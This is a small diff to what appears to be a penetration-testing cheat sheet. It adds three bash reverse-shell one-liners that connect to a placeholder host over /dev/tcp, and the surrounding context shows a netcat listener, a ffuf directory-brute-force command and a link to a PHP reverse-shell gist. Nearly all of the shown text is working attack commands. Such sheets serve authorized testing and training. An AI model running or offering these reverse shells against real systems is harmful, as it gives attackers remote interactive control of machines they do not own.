@@ -98,6 +98,14 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u targetUr
 nc -lnvp 1234
 ```
 
+- bash
+
+```sh
+exec 5<>/dev/tcp/my_ip/my_port
+/bin/bash -i >& /dev/tcp/my_ip/my_port 0>&1
+/bin/bash -c "bash -i >& /dev/tcp/my_ip/my_port 0>&1"
+```
+
 - [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc)
 ```php
 <?php
